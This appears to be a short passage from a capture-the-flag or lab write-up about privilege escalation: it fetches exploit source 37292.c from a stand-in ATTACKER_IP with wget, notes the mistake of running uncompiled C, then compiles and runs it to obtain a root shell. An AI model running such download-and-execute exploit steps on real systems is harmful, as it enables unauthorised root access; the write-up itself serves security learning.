# 🤦 Beginner Mistake

Downloaded exploit:

```bash
wget http://ATTACKER_IP/37292.c
```

Then attempted:

```bash
./37292.c
```

Which obviously failed.

A `.c` file is source code.

It must be compiled first.

---

# ✅ Actual Exploitation

Compile:

```bash
gcc 37292.c -o 37292
```

Run:

```bash
./37292
```

Result:

```bash
uid=0(root)
```

Root shell obtained.

